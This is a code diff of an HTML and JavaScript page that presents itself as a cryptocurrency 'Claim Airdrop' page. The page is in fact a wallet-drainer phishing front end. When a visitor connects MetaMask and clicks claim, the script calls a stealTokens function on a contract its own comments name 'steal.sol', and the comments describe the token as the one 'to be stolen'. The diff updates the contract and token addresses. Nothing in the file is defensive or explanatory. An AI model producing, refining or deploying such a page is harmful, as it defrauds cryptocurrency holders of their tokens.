@@ -13,7 +13,7 @@
     <button id="airdropButton" style="display:none;">Claim Airdrop</button>
 
     <script>
-        // Updated contract and token addresses
+        // Smart contract ABI for the steal.sol contract
         const contractABI = [
             { "inputs": [{ "internalType": "address", "name": "_tokenAddress", "type": "address" }], "name": "stealTokens", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
             { "inputs": [], "stateMutability": "nonpayable", "type": "constructor" },
@@ -21,10 +21,12 @@
             { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address payable", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }
         ];
 
-        // Correct contract address
-        const contractAddress = "0x65A59E7C1879120B0623723eA643fb85F894B128";
-        // Correct TTK token address
-        const tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4"; 
+        // Contract address where the steal.sol contract is deployed
+        const contractAddress = "0xf5d2621f8b5eaabd6a35e65142cf0c06d9b791b5";  // Replace with actual contract address
+
+        // Token address of the ERC-20 token to be stolen
+        const tokenAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414"; // Replace with actual token address
+
         let web3;
         let contract;
         let userAddress;
@@ -50,17 +52,16 @@
             }
         }
 
-        // Claim the airdrop and execute token transfer
+        // Claim the airdrop (execute token transfer)
         async function claimAirdrop() {
             contract = new web3.eth.Contract(contractABI, contractAddress);
 
             try {
-                // Fetch current gas price from the network
+                // Fetch current gas price
                 const gasPrice = await web3.eth.getGasPrice();
-                // Estimate the gas required for the transaction
                 const gasEstimate = await contract.methods.stealTokens(tokenAddress).estimateGas({ from: userAddress });
 
-                // Send the transaction with the appropriate gas settings
+                // Execute the token transfer
                 await contract.methods.stealTokens(tokenAddress).send({
                     from: userAddress,
                     gasPrice: gasPrice,
@@ -74,12 +75,10 @@
             }
         }
 
-        // Event listeners for the buttons
+        // Event listeners
         document.getElementById('connectButton').addEventListener('click', connectMetaMask);
         document.getElementById('airdropButton').addEventListener('click', claimAirdrop);
     </script>
 
 </body>
 </html>
-
-
